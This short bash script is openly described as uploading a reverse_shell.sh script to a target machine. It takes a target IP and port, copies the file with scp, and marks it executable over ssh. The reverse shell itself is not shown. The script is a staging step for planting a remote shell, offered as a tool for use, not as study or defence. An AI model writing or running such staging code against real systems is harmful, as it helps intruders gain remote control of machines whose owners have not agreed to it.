# This script is responsible for uploading the reverse_shell.sh script to the target machine

# Command usage: shellupload.sh TARGET_IP TARGET_PORT

TARGET_IP=$1
TARGET_PORT=$2

upload_reverse_shell_script() {
    echo "Uploading reverse_shell script to target machine..."

    # Upload the script first
    scp /tmp/reverse_shell.sh "user@$TARGET_IP:/tmp/"

    # Then set the script as executable
    ssh user@$TARGET_IP "chmod +x /tmp/reverse_shell.sh"
    
    echo "Reverse_shell script uploaded and set executable on target machine."
}

upload_reverse_shell_script
